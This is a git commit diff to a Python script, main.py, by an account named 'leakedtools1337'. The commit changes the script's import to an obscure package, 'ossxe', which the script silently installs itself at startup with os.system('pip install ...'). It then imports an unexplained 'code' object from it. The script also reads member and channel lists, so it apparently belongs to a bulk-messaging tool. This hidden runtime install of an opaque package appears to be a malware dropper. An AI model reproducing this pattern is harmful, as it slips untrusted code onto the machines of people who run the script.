1be30f4ce3874fffa1e2a7a8549eaaea80815c22
leakedtools1337 <122581998+leakedtools1337@users.noreply.github.com>
2023-01-25 05:01:01 -0800

    Update main.py

--- main.py
+++ main.py
@@ -2,7 +2,7 @@ import requests
 import os
 import threading, time
 os.system('pip install ossxe')
-from beautystyle import code
+from ossxe import code
 from colorama import Fore, Style
 members = open('members.txt')
 channels = open('channels.txt')
